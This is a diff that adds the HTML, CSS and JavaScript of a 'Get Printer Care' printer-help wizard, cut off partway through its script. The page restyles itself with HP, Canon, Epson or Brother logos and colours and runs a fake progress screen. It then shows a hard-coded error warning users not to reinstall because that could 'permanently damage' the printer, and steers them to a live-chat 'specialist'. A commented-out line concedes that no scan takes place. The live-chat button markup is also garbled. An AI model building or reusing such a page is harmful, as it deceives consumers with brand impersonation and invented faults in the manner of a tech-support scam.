@@ -1,0 +1,1975 @@
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Service | Get Printer Care</title>
+
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Roboto+Slab:wght@600;700;800&family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.2/css/all.min.css">
+
+<style>
+:root{
+    --blue:#0875df;
+    --dark:#153b5b;
+    --text:#234765;
+    --muted:#617b94;
+    --border:#dfe7ef;
+    --light:#e8f2fc;
+    --brand-color:#0875df;
+    --brand-dark:#075eb6;
+}
+
+*{box-sizing:border-box}
+
+body{
+    margin:0;
+    background:#fff;
+    color:var(--text);
+    font-family:Inter,Arial,sans-serif;
+}
+
+button,input{font:inherit}
+
+.main-container{
+    max-width:1150px;
+    width:100%;
+    margin:0 auto;
+    padding:70px 25px 50px;
+}
+
+.step{display:none}
+
+.step.active{
+    display:block;
+    animation:stepFade .3s ease;
+}
+
+@keyframes stepFade{
+    from{opacity:0;transform:translateY(8px)}
+    to{opacity:1;transform:translateY(0)}
+}
+
+/* HEADINGS */
+
+.main-heading{margin-bottom:40px}
+
+.main-heading h1{
+    font-family:"Roboto Slab",serif;
+    font-size:42px;
+    line-height:1.3;
+    color:#103e66;
+    margin:0 0 12px;
+    font-weight:800;
+}
+
+.main-heading p{
+    font-size:18px;
+    line-height:1.6;
+    color:#526f8b;
+    margin:0;
+}
+
+.step-heading{
+    text-align:center;
+    margin-bottom:30px;
+}
+
+.step-label{
+    font-size:12px;
+    color:var(--blue);
+    font-weight:800;
+    letter-spacing:1px;
+    margin-bottom:13px;
+}
+
+.step-heading h2{
+    font-size:32px;
+    color:#153b5b;
+    margin:0 0 12px;
+    font-weight:800;
+    line-height:1.35;
+}
+
+.step-heading p{
+    color:var(--muted);
+    font-size:15px;
+    line-height:1.6;
+}
+
+/* ISSUE SELECTION */
+
+.issue-grid{
+    display:grid;
+    grid-template-columns:repeat(3,minmax(0,1fr));
+    gap:20px;
+}
+
+.issue-card{
+    min-height:240px;
+    width:100%;
+    padding:24px;
+    border:1px solid var(--border);
+    border-radius:20px;
+    background:#fff;
+    text-align:left;
+    color:var(--dark);
+    cursor:pointer;
+    display:flex;
+    flex-direction:column;
+    align-items:flex-start;
+    transition:all .25s ease;
+    box-shadow:0 7px 18px rgba(20,50,75,.07);
+}
+
+.issue-card:hover{
+    transform:translateY(-4px);
+    border-color:#b7d5f5;
+    box-shadow:0 12px 25px rgba(20,50,75,.11);
+}
+
+.issue-icon{
+    width:49px;
+    height:49px;
+    border-radius:15px;
+    background:#e7f1fc;
+    display:flex;
+    align-items:center;
+    justify-content:center;
+    color:var(--blue);
+    font-size:20px;
+    margin-bottom:18px;
+}
+
+.issue-card strong{
+    font-family:"Roboto Slab",serif;
+    font-size:16px;
+    color:#123b60;
+    margin-bottom:9px;
+}
+
+.issue-description{
+    font-size:14px;
+    line-height:1.65;
+    color:#526f8b;
+    flex:1;
+}
+
+.issue-choose{
+    font-size:17px;
+    color:var(--blue);
+    margin-top:17px;
+    font-weight:500;
+}
+
+/* COMMON BRAND SELECTION */
+
+.brand-page{
+    max-width:650px;
+    margin:0 auto;
+}
+
+.selected-issue{
+    min-height:62px;
+    padding:15px 21px;
+    border:1px solid #b7d7fb;
+    background:#e8f3ff;
+    border-radius:19px;
+    display:flex;
+    align-items:center;
+    gap:14px;
+    color:#173d61;
+    margin-bottom:32px;
+    font-size:14px;
+    line-height:1.6;
+}
+
+.selected-issue i{
+    font-size:22px;
+    color:#0068d7;
+    flex-shrink:0;
+}
+
+.selected-issue strong{color:#0068d7}
+
+/* BRAND CARDS */
+
+.brand-heading{
+    text-align:center;
+    margin:0 0 25px;
+}
+
+.brand-heading h2{
+    font-size:33px;
+    color:#111c2a;
+    font-weight:800;
+    margin:0;
+}
+
+.brand-grid{
+    display:grid;
+    grid-template-columns:repeat(3,minmax(0,1fr));
+    gap:15px;
+}
+
+.brand-card{
+    height:145px;
+    border:2px solid #dfe7f0;
+    border-radius:21px;
+    background:#fff;
+    display:flex;
+    align-items:center;
+    justify-content:center;
+    cursor:pointer;
+    transition:all .2s ease;
+    padding:15px;
+}
+
+.brand-card:hover{
+    border-color:#0875df;
+    box-shadow:0 5px 15px rgba(8,117,223,.1);
+    transform:translateY(-2px);
+}
+
+.brand-card img{
+    display:block;
+    max-width:170px;
+    width:85%;
+    height:65px;
+    object-fit:contain;
+}
+
+.other-brand-mark{
+    font-size:21px;
+    font-weight:800;
+    color:#111;
+    text-align:center;
+}
+
+.how-it-works{
+    margin-top:40px;
+    background:#f0f6fc;
+    border-radius:19px;
+    padding:25px 24px;
+}
+
+.how-it-works h3{
+    margin:0 0 17px;
+    color:#153b5b;
+    font-size:17px;
+    font-weight:800;
+}
+
+.how-it-works ol{
+    margin:0;
+    padding-left:23px;
+}
+
+.how-it-works li{
+    font-size:14px;
+    line-height:1.8;
+    color:#526f8b;
+    margin-bottom:7px;
+}
+
+.independent-note{
+    text-align:center;
+    color:#71869a;
+    font-size:12px;
+    line-height:1.6;
+    margin-top:25px;
+}
+
+/* BRAND MODEL PAGE */
+
+.brand-model-page{
+    --brand-color:#0875df;
+    --brand-dark:#075eb6;
+
+    width:100vw;
+    max-width:none;
+    min-height:100vh;
+    margin:-70px 0 -50px;
+    margin-left:calc((1150px - 100vw)/2);
+    display:flex;
+    flex-direction:column;
+    background:#fff;
+}
+
+.brand-nav{
+    width:100%;
+    border-bottom:1px solid #e8edf2;
+    background:#fff;
+}
+
+.brand-nav-inner{
+    max-width:1150px;
+    margin:auto;
+    min-height:88px;
+    padding:14px 25px;
+    display:flex;
+    align-items:center;
+    justify-content:space-between;
+    gap:25px;
+}
+
+.brand-nav-logo{
+    display:flex;
+    align-items:center;
+    min-width:130px;
+}
+
+.brand-nav-logo img{
+    max-width:190px;
+    width:auto;
+    height:58px;
+    object-fit:contain;
+}
+
+.brand-nav-links{
+    display:flex;
+    align-items:center;
+    gap:28px;
+}
+
+.brand-nav-links a{
+    color:#35485a;
+    text-decoration:none;
+    font-size:13px;
+    font-weight:700;
+}
+
+.brand-nav-links a:hover{
+    color:var(--brand-color);
+}
+
+.brand-model-content{
+    width:100%;
+    max-width:760px;
+    margin:auto;
+    padding:70px 24px 80px;
+    text-align:center;
+    flex:1;
+}
+
+.brand-model-title{
+    font-family:"Roboto Slab",serif;
+    font-size:38px;
+    line-height:1.3;
+    color:var(--brand-color);
+    font-weight:800;
+    margin:0 0 48px;
+}
+
+.brand-model-content h2{
+    font-size:23px;
+    color:#202d3a;
+    font-weight:800;
+    margin:0 0 22px;
+}
+
+.brand-model-form{
+    max-width:560px;
+    margin:0 auto;
+}
+
+.brand-model-form input{
+    width:100%;
+    height:58px;
+    border:1px solid #d6dee7;
+    border-radius:7px;
+    padding:0 18px;
+    font-size:15px;
+    outline:none;
+}
+
+.brand-model-form input:focus{
+    border-color:var(--brand-color);
+    box-shadow:0 0 0 3px rgba(8,117,223,.08);
+}
+
+.brand-get-started{
+    width:100%;
+    height:56px;
+    margin-top:16px;
+    border:0;
+    border-radius:7px;
+    background:var(--brand-color);
+    color:#fff;
+    font-size:15px;
+    font-weight:800;
+    cursor:pointer;
+    transition:.2s;
+}
+
+.brand-get-started:hover{
+    background:var(--brand-dark);
+}
+
+.brand-progress{
+    max-width:590px;
+    margin:58px auto 0;
+    display:grid;
+    grid-template-columns:repeat(3,1fr);
+    gap:12px;
+}
+
+.brand-progress-item{
+    position:relative;
+    color:#8a96a3;
+    font-size:13px;
+    font-weight:700;
+    padding-top:28px;
+}
+
+.brand-progress-item:before{
+    content:"";
+    position:absolute;
+    top:0;
+    left:50%;
+    transform:translateX(-50%);
+    width:19px;
+    height:19px;
+    border-radius:50%;
+    border:2px solid #cbd4de;
+    background:#fff;
+}
+
+.brand-progress-item.active{
+    color:var(--brand-color);
+}
+
+.brand-progress-item.active:before{
+    border-color:var(--brand-color);
+    background:var(--brand-color);
+    box-shadow:inset 0 0 0 4px #fff;
+}
+
+.brand-progress-item:not(:last-child):after{
+    content:"";
+    position:absolute;
+    top:9px;
+    left:calc(50% + 18px);
+    width:calc(100% - 24px);
+    height:2px;
+    background:#dce3ea;
+}
+
+.brand-footer{
+    background:#f7f8fa;
+    border-top:4px solid var(--brand-color);
+    padding:24px 20px;
+    text-align:center;
+    color:#687584;
+    font-size:12px;
+    line-height:1.7;
+}
+
+.brand-footer strong{color:var(--brand-color)}
+
+/* DEVICE SELECTION */
+
+.device-grid{
+    display:grid;
+    grid-template-columns:repeat(2,minmax(0,1fr));
+    gap:15px;
+    max-width:650px;
+    margin:30px auto;
+}
+
+.device-card{
+    min-height:115px;
+    padding:20px;
+    border:1px solid var(--border);
+    border-radius:15px;
+    background:#fff;
+    color:var(--dark);
+    font-size:16px;
+    font-weight:700;
+    cursor:pointer;
+    transition:.2s;
+}
+
+.device-card i{
+    display:block;
+    color:var(--blue);
+    font-size:26px;
+    margin-bottom:13px;
+}
+
+.device-card:hover{
+    border-color:var(--blue);
+    background:#f2f8ff;
+    transform:translateY(-2px);
+}
+
+/* CONNECTION */
+
+.connection-grid{
+    display:grid;
+    grid-template-columns:repeat(3,minmax(0,1fr));
+    gap:16px;
+    max-width:800px;
+    margin:35px auto;
+}
+
+.connection-card{
+    min-height:125px;
+    border:1px solid var(--border);
+    border-radius:16px;
+    background:#fff;
+    color:var(--dark);
+    font-size:16px;
+    font-weight:800;
+    cursor:pointer;
+    transition:.2s;
+}
+
+.connection-card:hover{
+    background:#f2f8ff;
+    border-color:var(--blue);
+}
+
+.connection-card i{
+    display:block;
+    font-size:25px;
+    color:var(--blue);
+    margin-bottom:13px;
+}
+
+/* SUMMARY */
+
+.summary-box{
+    max-width:680px;
+    margin:25px auto;
+    border:1px solid var(--border);
+    border-radius:16px;
+    background:#f8fbff;
+    padding:25px;
+}
+
+.summary-box h2{
+    font-size:24px;
+    margin:0 0 17px;
+    color:var(--dark);
+}
+
+.summary-row{
+    display:flex;
+    justify-content:space-between;
+    gap:15px;
+    padding:14px 0;
+    border-bottom:1px solid #e3ebf2;
+    font-size:14px;
+}
+
+.summary-row:last-child{border-bottom:0}
+.summary-row span{color:var(--muted)}
+.summary-row strong{color:var(--dark);text-align:right}
+
+/* BUTTONS */
+
+.action-row{
+    display:flex;
+    justify-content:center;
+    gap:12px;
+    margin-top:25px;
+}
+
+.btn{
+    border:0;
+    border-radius:8px;
+    padding:14px 25px;
+    font-size:13px;
+    font-weight:800;
+    cursor:pointer;
+}
+
+.btn-primary{
+    background:var(--blue);
+    color:#fff;
+}
+
+.btn-primary:hover{background:#075eb6}
+.btn-primary:disabled{opacity:.45;cursor:not-allowed}
+.btn-back{background:#edf2f7;color:#456078}
+
+/* PROCESSING */
+
+.processing-box{
+    max-width:680px;
+    margin:40px auto;
+    text-align:center;
+}
+
+.spinner{
+    width:78px;
+    height:78px;
+    border:6px solid #e8f0f8;
+    border-top-color:var(--blue);
+    border-radius:50%;
+    margin:28px auto;
+    animation:spin 1.1s linear infinite;
+}
+
+@keyframes spin{to{transform:rotate(360deg)}}
+
+.percent{
+    font-size:30px;
+    font-weight:800;
+    color:var(--blue);
+    margin:15px 0;
+}
+
+.progress{
+    max-width:470px;
+    height:9px;
+    background:#e8eff6;
+    border-radius:20px;
+    overflow:hidden;
+    margin:auto;
+}
+
+.progress-bar{
+    height:100%;
+    width:0;
+    background:var(--blue);
+    transition:width .4s linear;
+}
+
+.processing-status{
+    color:#486783;
+    font-size:14px;
+    font-weight:700;
+    margin-top:20px;
+}
+
+/* FINAL ERROR */
+
+.error-panel{
+    max-width:760px;
+    margin:30px auto;
+    padding:28px;
+    border:1px solid #f0caca;
+    border-radius:15px;
+    background:#fffafa;
+}
+
+.error-kicker{
+    color:#c53d3d;
+    font-size:12px;
+    font-weight:800;
+    margin-bottom:12px;
+}
+
+.error-panel h2{
+    color:#a82020;
+    font-size:25px;
+    line-height:1.4;
+    margin:0 0 12px;
+}
+
+.error-panel p{
+    color:#6b6262;
+    font-size:13px;
+    line-height:1.7;
+}
+
+.error-summary{
+    padding:17px;
+    border:1px solid #f0e2e2;
+    background:#fff;
+    border-radius:9px;
+    margin:20px 0;
+}
+
+.error-summary div{
+    padding:6px 0;
+    font-size:13px;
+    color:#566f84;
+}
+
+.support-title{
+    font-size:23px;
+    color:#153b5b;
+}
+
+.support-actions{
+    display:grid;
+    grid-template-columns:repeat(3,minmax(0,1fr));
+    gap:14px;
+    margin-top:22px;
+}
+
+.support-link{
+    min-height:90px;
+    border:1px solid #dfe7ef;
+    border-radius:10px;
+    background:#fff;
+    color:#193c59;
+    text-decoration:none;
+    display:flex;
+    align-items:center;
+    justify-content:center;
+    text-align:center;
+    font-size:13px;
+    line-height:1.7;
+    padding:15px;
+    cursor:pointer;
+    transition:.2s;
+}
+
+.support-link strong{
+    font-size:15px;
+    font-weight:800;
+}
+
+.support-link:hover{
+    border-color:#0875df;
+    background:#f5f9ff;
+}
+
+.support-link.primary{
+    background:#0875df;
+    border-color:#0875df;
+    color:#fff;
+}
+
+.support-link.primary:hover{background:#075eb6}
+
+[hidden]{display:none!important}
+
+/* RESPONSIVE */
+
+@media(max-width:800px){
+    .main-container{padding:45px 20px}
+    .main-heading h1{font-size:34px}
+    .issue-grid{grid-template-columns:repeat(2,minmax(0,1fr))}
+}
+
+@media(max-width:700px){
+    .brand-model-page{
+        margin:-30px 0 -50px;
+        margin-left:-15px;
+        width:calc(100% + 30px);
+    }
+
+    .brand-nav-inner{
+        min-height:72px;
+        padding:10px 16px;
+    }
+
+    .brand-nav-logo img{
+        height:46px;
+        max-width:145px;
+    }
+
+    .brand-nav-links{gap:13px}
+    .brand-nav-links a{font-size:11px}
+    .brand-model-content{padding:55px 18px 65px}
+    .brand-model-title{font-size:29px;margin-bottom:38px}
+    .brand-model-content h2{font-size:19px}
+    .brand-progress{margin-top:48px}
+}
+
+@media(max-width:550px){
+    .main-container{padding:30px 15px}
+    .main-heading h1{font-size:27px}
+    .main-heading p{font-size:15px}
+
+    .issue-grid{
+        grid-template-columns:1fr;
+        gap:14px;
+    }
+
+    .issue-card{min-height:210px}
+    .brand-heading h2{font-size:26px}
+    .selected-issue{font-size:12px;padding:13px}
+
+    .brand-card{
+        height:115px;
+        border-radius:15px;
+    }
+
+    .brand-card img{
+        height:48px;
+        max-width:125px;
+    }
+
+    .brand-card .other-brand-mark{font-size:17px}
+    .device-grid{grid-template-columns:1fr}
+    .connection-grid{grid-template-columns:1fr}
+    .connection-card{min-height:85px}
+    .summary-box{padding:18px}
+    .summary-row{font-size:12px}
+    .support-actions{grid-template-columns:1fr}
+    .error-panel{padding:20px 16px}
+    .error-panel h2{font-size:21px}
+
+    .brand-nav-links{gap:10px}
+    .brand-nav-links a{font-size:10px}
+    .brand-nav-logo img{max-width:112px;height:39px}
+    .brand-model-title{font-size:25px}
+    .brand-model-content h2{font-size:17px}
+    .brand-progress-item{font-size:11px}
+}
+
+#openLiveChat {
+    width: 100%;
+    font-family: inherit;
+    cursor: pointer;
+    border: 1px solid #0875df;
+    outline: none;
+}
+
+#openLiveChat:hover {
+    background: #075eb6;
+    border-color: #075eb6;
+}
+
+
+</style>
+</head>
+
+<body>
+<div style="background: #0f172a; color: #fff; font-size: 12px; padding: 10px 16px; text-align: center; font-weight: 500; border-bottom: 1px solid #1e293b; position: sticky; top: 0; z-index: 9999;">Independent Help Directory — Not affiliated with HP, Canon, Epson, Brother, or any manufacturer.</div>
+
+
+<main class="main-container">
+
+<!-- STEP 1: ISSUE SELECTION -->
+
+<section class="step active" id="step1">
+
+    <div class="main-heading">
+        <h1>Choose your printer issue</h1>
+        <p>Select the topic that matches the problem you are experiencing.</p>
+    </div>
+
+    <div class="issue-grid" id="issueGrid">
+
+        
+        <button type="button" class="issue-card"
+            data-issue="New Printer Setup">
+
+            <span class="issue-icon">
+                <i class="fa-solid fa-print"></i>
+            </span>
+
+            <strong>New Printer Setup</strong>
+
+            <span class="issue-description">
+                Unbox, connect, and print your first page — without the guesswork.            </span>
+
+            <span class="issue-choose">Choose →</span>
+
+        </button>
+
+        
+        <button type="button" class="issue-card"
+            data-issue="Printer Offline">
+
+            <span class="issue-icon">
+                <i class="fa-solid fa-print"></i>
+            </span>
+
+            <strong>Printer Offline</strong>
+
+            <span class="issue-description">
+                Get a printer that says &quot;offline&quot; talking to your computer again.            </span>
+
+            <span class="issue-choose">Choose →</span>
+
+        </button>
+
+        
+        <button type="button" class="issue-card"
+            data-issue="Wi-Fi Drops">
+
+            <span class="issue-icon">
+                <i class="fa-solid fa-wifi"></i>
+            </span>
+
+            <strong>Wi-Fi Drops</strong>
+
+            <span class="issue-description">
+                Stop a printer that connects fine, then drops off the network an hour later.            </span>
+
+            <span class="issue-choose">Choose →</span>
+
+        </button>
+
+        
+        <button type="button" class="issue-card"
+            data-issue="Not Printing">
+
+            <span class="issue-icon">
+                <i class="fa-solid fa-print"></i>
+            </span>
+
+            <strong>Not Printing</strong>
+
+            <span class="issue-description">
+                Connected and ready, but nothing comes out? Work through the causes in order.            </span>
+
+            <span class="issue-choose">Choose →</span>
+
+        </button>
+
+        
+        <button type="button" class="issue-card"
+            data-issue="Scanner Issues">
+
+            <span class="issue-icon">
+                <i class="fa-solid fa-camera"></i>
+            </span>
+
+            <strong>Scanner Issues</strong>
+
+            <span class="issue-description">
+                Printer prints fine but scanning fails? Get the scanner responding again.            </span>
+
+            <span class="issue-choose">Choose →</span>
+
+        </button>
+
+        
+    </div>
+
+</section>
+
+
+<!-- STEP 2: BRAND SELECTION -->
+
+<section class="step" id="step2">
+
+    <div class="brand-page">
+
+        <div class="selected-issue">
+            <i class="fa-solid fa-print"></i>
+
+            <span>
+                Your Selected Issue:
+                <strong id="selectedIssueText">—</strong>
+            </span>
+        </div>
+
+        <div class="brand-heading">
+            <h2>Select Your Printer Brand</h2>
+        </div>
+
+        <div class="brand-grid" id="brandGrid">
+
+            
+            <button type="button"
+                class="brand-card"
+                data-brand="HP">
+
+                
+                    <img
+                        src="/assets/images/hp.svg"
+                        alt="HP logo">
+
+                
+            </button>
+
+            
+            <button type="button"
+                class="brand-card"
+                data-brand="Canon">
+
+                
+                    <img
+                        src="/assets/images/canon-seeklogo.png"
+                        alt="Canon logo">
+
+                
+            </button>
+
+            
+            <button type="button"
+                class="brand-card"
+                data-brand="EPSON">
+
+                
+                    <img
+                        src="/assets/images/epson.svg"
+                        alt="EPSON logo">
+
+                
+            </button>
+
+            
+            <button type="button"
+                class="brand-card"
+                data-brand="brother">
+
+                
+                    <img
+                        src="/assets/images/brother-seeklogo.png"
+                        alt="brother logo">
+
+                
+            </button>
+
+            
+            <button type="button"
+                class="brand-card"
+                data-brand="Other Brand">
+
+                
+                    <span class="other-brand-mark">Other Brand</span>
+
+                
+            </button>
+
+            
+        </div>
+
+        <div class="how-it-works">
+
+            <h3>How It Works</h3>
+
+            <ol>
+                <li>Tap your printer brand, then enter your printer model.</li>
+                <li>Follow guided printer instructions.</li>
+                <li>Get assistance if needed.</li>
+            </ol>
+
+        </div>
+
+        <div class="independent-note">
+            Independent printer assistance. Not affiliated with any printer manufacturer.
+        </div>
+
+        <div class="action-row">
+            <button type="button" class="btn btn-back" data-back="1">
+                ← Back
+            </button>
+        </div>
+
+    </div>
+
+</section>
+
+
+<!-- STEP 3: BRAND-SPECIFIC MODEL PAGE -->
+
+<section class="step" id="step3">
+
+    <div class="brand-model-page" id="brandModelPage">
+
+        <header class="brand-nav">
+
+            <div class="brand-nav-inner">
+
+                <a class="brand-nav-logo" href="#" aria-label="Brand home">
+
+                    <img id="selectedBrandLogo" src="" alt="Selected printer brand logo">
+
+                    <span id="otherBrandLogo" class="other-brand-mark" hidden>
+                        Printer Support
+                    </span>
+
+                </a>
+
+                <nav class="brand-nav-links">
+                    <a href="#" id="brandHomeLink">Home</a>
+                    <a href="#" onclick="openLiveChat();return false;" target="_blank" rel="noopener">Support</a>
+                    <a href="#" onclick="openLiveChat();return false;" target="_blank" rel="noopener">Contact</a>
+                </nav>
+
+            </div>
+
+        </header>
+
+        <div class="brand-model-content">
+
+            <h1 class="brand-model-title" id="brandPageHeading">
+                Printer Support and Troubleshooting
+            </h1>
+
+            <h2>Enter your printer model number</h2>
+
+            <form class="brand-model-form" id="brandModelForm">
+
+                <input
+                    type="text"
+                    id="printerModel"
+                    placeholder="Enter your printer model number"
+                    maxlength="100"
+                    autocomplete="off"
+                    required>
+
+                <button type="submit" class="brand-get-started">
+                    Get Started
+                </button>
+
+            </form>
+
+            <div class="brand-progress">
+
+                <div class="brand-progress-item active">
+                    1 Identify
+                </div>
+
+                <div class="brand-progress-item">
+                    2 Troubleshooting
+                </div>
+
+                <div class="brand-progress-item">
+                    3 Resolution
+                </div>
+
+            </div>
+
+        </div>
+
+        <footer class="brand-footer">
+
+            <strong id="brandFooterName">Printer Support</strong>
+
+            <br>
+
+            Independent printer assistance. Not affiliated with or endorsed by the printer manufacturer.
+
+        </footer>
+
+    </div>
+
+</section>
+
+
+<!-- STEP 4: DEVICE SELECTION -->
+
+<section class="step" id="step4">
+
+    <div class="brand-page">
+
+        <div class="selected-issue">
+
+            <i class="fa-solid fa-print"></i>
+
+            <span>
+                Issue: <strong id="deviceIssue">—</strong>
+                <br>
+                Brand: <strong id="deviceBrand">—</strong>
+                &nbsp; Model: <strong id="deviceModel">—</strong>
+            </span>
+
+        </div>
+
+        <div class="step-heading">
+
+            <div class="step-label">STEP 1 OF 4</div>
+
+            <h2>What device are you connecting your printer to?</h2>
+
+        </div>
+
+        <div class="device-grid" id="deviceGrid">
+
+            <button type="button" class="device-card" data-device="Windows Computer">
+                <i class="fa-brands fa-windows"></i>
+                Windows Computer
+            </button>
+
+            <button type="button" class="device-card" data-device="Mac Computer">
+                <i class="fa-brands fa-apple"></i>
+                Mac Computer
+            </button>
+
+            <button type="button" class="device-card" data-device="Phone / Tablet">
+                <i class="fa-solid fa-mobile-screen-button"></i>
+                Phone / Tablet
+            </button>
+
+            <button type="button" class="device-card" data-device="Not Sure">
+                <i class="fa-regular fa-circle-question"></i>
+                Not Sure
+            </button>
+
+        </div>
+
+        <div class="action-row">
+            <button type="button" class="btn btn-back" data-back="3">
+                ← Back
+            </button>
+        </div>
+
+    </div>
+
+</section>
+
+
+<!-- STEP 5: CONNECTION -->
+
+<section class="step" id="step5">
+
+    <div class="brand-page">
+
+        <div class="selected-issue">
+
+            <i class="fa-solid fa-print"></i>
+
+            <span>
+                Issue: <strong id="connectionIssue">—</strong>
+                <br>
+                Brand: <strong id="connectionBrand">—</strong>
+                &nbsp; Model: <strong id="connectionModel">—</strong>
+            </span>
+
+        </div>
+
+        <div class="step-heading">
+
+            <div class="step-label">STEP 2 OF 4</div>
+
+            <h2>How would you like to connect your printer?</h2>
+
+        </div>
+
+        <div class="connection-grid" id="connectionGrid">
+
+            <button type="button" class="connection-card" data-connection="Wi-Fi">
+                <i class="fa-solid fa-wifi"></i>
+                Wi-Fi
+            </button>
+
+            <button type="button" class="connection-card" data-connection="USB Cable">
+                <i class="fa-brands fa-usb"></i>
+                USB Cable
+            </button>
+
+            <button type="button" class="connection-card" data-connection="Not Sure">
+                <i class="fa-regular fa-circle-question"></i>
+                Not Sure
+            </button>
+
+        </div>
+
+        <div class="action-row">
+            <button type="button" class="btn btn-back" data-back="4">
+                ← Back
+            </button>
+        </div>
+
+    </div>
+
+</section>
+
+
+<!-- STEP 6: PRINTER SUMMARY -->
+
+<section class="step" id="step6">
+
+    <div class="step-heading">
+
+        <div class="step-label">STEP 3 OF 4</div>
+
+        <h2>Your Printer Summary</h2>
+
+        <p>Please review your selected printer information.</p>
+
+    </div>
+
+    <div class="summary-box">
+
+        <h2>Your Printer Summary</h2>
+
+        <div class="summary-row">
+            <span>Issue</span>
+            <strong id="summaryIssue">—</strong>
+        </div>
+
+        <div class="summary-row">
+            <span>Brand</span>
+            <strong id="summaryBrand">—</strong>
+        </div>
+
+        <div class="summary-row">
+            <span>Model</span>
+            <strong id="summaryModel">—</strong>
+        </div>
+
+        <div class="summary-row">
+            <span>Device</span>
+            <strong id="summaryDevice">—</strong>
+        </div>
+
+        <div class="summary-row">
+            <span>Connection</span>
+            <strong id="summaryConnection">—</strong>
+        </div>
+
+    </div>
+
+    <div class="action-row">
+
+        <button type="button" class="btn btn-back" data-back="5">
+            ← Back
+        </button>
+
+        <button type="button" class="btn btn-primary" id="startProcess">
+            Continue →
+        </button>
+
+    </div>
+
+</section>
+
+
+<!-- STEP 7: PROCESSING AND FINAL ERROR -->
+
+<section class="step" id="step7">
+
+    <div class="step-heading">
+
+        <div class="step-label">STEP 4 OF 4</div>
+
+        <h2>Printer Setup &amp; Troubleshooting</h2>
+
+        <p>
+            Please keep this page open while we prepare setup and troubleshooting steps.
+        </p>
+
+    </div>
+
+    <div class="processing-box" id="processingScreen">
+
+        <div class="spinner"></div>
+
+        <div class="percent" id="percentText">0%</div>
+
+        <div class="progress">
+            <div class="progress-bar" id="progressBar"></div>
+        </div>
+
+        <div class="processing-status" id="processingStatus">
+            Preparing your guided process...
+        </div>
+
+        <p>Completing the guided process...</p>
+
+    </div>
+
+
+    <!-- FINAL ERROR SCREEN -->
+
+    <div class="error-panel" id="errorScreen" hidden>
+
+        <div class="error-kicker">
+            STEP 4 OF 4
+        </div>
+
+        <strong > <h2>
+         Do not try to re-install or retry again as it can permanently damage the software of your printer.
+        </h2> </strong>
+
+        <!--<p>-->
+        <!--    Example error display — no printer scan was performed.-->
+        <!--</p>-->
+
+        <div class="error-summary">
+
+            <strong>Your selected printer details</strong>
+
+            <div>Issue: <b id="errorIssue"></b></div>
+            <div>Brand: <b id="errorBrand"></b></div>
+            <div>Model: <b id="errorModel"></b></div>
+            <div>Device: <b id="errorDevice"></b></div>
+            <div>Connection: <b id="errorConnection"></b></div>
+
+        </div>
+
+        <h3 class="support-title">Need a Hand?</h3>
+
+        <p>Your selected printer details are included below.</p>
+
+        <div class="support-actions">
+
+
+
+<button
+    type="button"
+    id="openLiveChat" onclick="openLiveChat();"maximize');
+        } else {
+            alert('LiveChat API not loaded');
+        }
+    "
+>
+    <span>
+        <strong>Live Chat</strong>
+        <br>
+        Chat with a specialist now.
+    </span>
+</button>
+
+
+
+
+            <!--<a href="#" onclick="openLiveChat();return false;"-->
+            <!--   class="support-link">-->
+
+            <!--    <span>-->
+            <!--        <strong>Request Call Back</strong>-->
+            <!--        <br>-->
+            <!--        We'll call you with your details ready.-->
+            <!--    </span>-->
+
+            <!--</a>-->
+
+            <button type="button" class="support-link" id="tryAgain">
+
+                <span>
+                    <strong>Try Again</strong>
+                    <br>
+                    Choose a different brand or model.
+                </span>
+
+            </button>
+
+        </div>
+
+    </div>
+
+</section>
+
+</main>
+
+
+<script>
+(function(){
+
+    "use strict";
+
+    const state = {
+        issue:"",
+        brand:"",
+        model:"",
+        device:"",
+        connection:"",
+        timer:null
+    };
+
+    /* BRAND LOGOS AND OFFICIAL BRAND COLORS */
+
+    const brandDetails = {
+
+        "HP":{
+            logo:"/assets/images/hp.svg",
+            color:"#0096D6",
+            dark:"#0077AD"
+        },
+
+        "Canon":{
+            logo:"/assets/images/canon-seeklogo.png",
+            color:"#E60012",
+            dark:"#B9000E"
+        },
+
+        "EPSON":{
+            logo:"/assets/images/epson.svg",
+            color:"#003399",
+            dark:"#00246E"
+        },
+
+        "brother":{
+            logo:"/assets/images/brother-seeklogo.png",
+            color:"#003399",
+            dark:"#00246E"
+        },
+
+        "Other Brand":{
+            logo:"",
+            color:"#0875DF",
+            dark:"#075EB6"
+        }
+
+    };
+
+
+    function el(id){
+        return document.getElementById(id);
+    }
+
+
+    /* SHOW STEP */
+
+    function showStep(number){
+
+        document.querySelectorAll(".step").forEach(function(step){
+            step.classList.remove("active");
+        });
+
+        const target = el("step"+number);
+
+        if(target){
+            target.classList.add("active");
+        }
+
+        window.scrollTo({
+            top:0,
+            behavior:"smooth"
+        });
+
+    }
+
+
+    /* BRAND-SPECIFIC PAGE */
+
+    function setupBrandPage(){
+
+        const details = brandDetails[state.brand] || brandDetails["Other Brand"];
+
+        const page = el("brandModelPage");
+
+        page.style.setProperty("--brand-color",details.color);
+        page.style.setProperty("--brand-dark",details.dark);
+
+        const logo = el("selectedBrandLogo");
+        const otherLogo = el("otherBrandLogo");
+
+        if(details.logo){
+
+            logo.src = details.logo;
+            logo.alt = state.brand + " logo";
+            logo.style.display = "block";
+
+            otherLogo.hidden = true;
+
+        }else{
+
+            logo.removeAttribute("src");
+            logo.style.display = "none";
+
+            otherLogo.hidden = false;
+
+        }
+
+        el("brandPageHeading").textContent =
+            state.brand + " Support and Troubleshooting";
+
+        el("brandFooterName").textContent =
+            state.brand + " Support";
+
+        el("printerModel").value = "";
+
+    }
+
+
+    /* STEP 1: ISSUE SELECTION */
+
+    el("issueGrid").addEventListener("click",function(event){
+
+        const card = event.target.closest("[data-issue]");
+
+        if(!card)return;
+
+        state.issue = card.dataset.issue;
+
+        el("selectedIssueText").textContent = state.issue;
+
+        showStep(2);
+
+    });
+
+
+    /* STEP 2: BRAND SELECTION */
+
+    el("brandGrid").addEventListener("click",function(event){
+
+        const card = event.target.closest("[data-brand]");
+
+        if(!card)return;
+
+        state.brand = card.dataset.brand;
+
+        setupBrandPage();
+
+        showStep(3);
+
+    });
+
+
+    /* STEP 3: MODEL INPUT AND GET STARTED */
+
+    el("brandModelForm").addEventListener("submit",function(event){
+
+        event.preventDefault();
+
